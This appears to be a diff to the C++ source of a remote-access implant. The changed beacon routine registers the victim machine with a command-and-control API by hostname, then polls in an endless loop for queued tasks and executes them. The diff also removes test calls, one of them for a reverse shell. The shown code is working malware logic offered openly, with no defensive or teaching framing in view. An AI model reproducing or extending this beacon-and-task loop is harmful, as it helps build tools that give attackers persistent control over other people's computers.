@@ -12,6 +12,7 @@
 #include <boost/uuid/uuid_io.hpp>
 #include <boost/property_tree/json_parser.hpp>
 #include <boost/property_tree/ptree.hpp>
+#include <boost/asio/ip/host_name.hpp>
 
 #include "../includes/single_include/nlohmann/json.hpp"
 
@@ -29,15 +30,28 @@ Implant::Implant()
 }
 
 void Implant::beacon() {
-    //api->register_device(id, "frogy");
+    Api api = Api::get_instance();
 
-    //api->send_result(std::make_unique<Result>(id, "Pong", 1));
+    /* Register device */
+    auto host = boost::asio::ip::host_name(); 
+    api.register_device(id, host);
 
-    //std::cout << api->assert_ping_pong() << std::endl;
-    test_get_tasks();
-    test_reverse_shell();
+    /* Loop */
+    while (true)
+    {
+        /* Assert that we can communicate with the API */
+        if (!api.assert_ping_pong()) {
+            sleep(3);
+            continue;
+        }
+        
+        /* Get all the tasks for this device */
+        std::string response_task_to_do = api.get_tasks(id);
+        parse_tasks_response(response_task_to_do);
+        run_all();
 
-    while (true);
+        sleep(3);
+    }
 }
 
 void Implant::parse_tasks_response(const std::string &response)
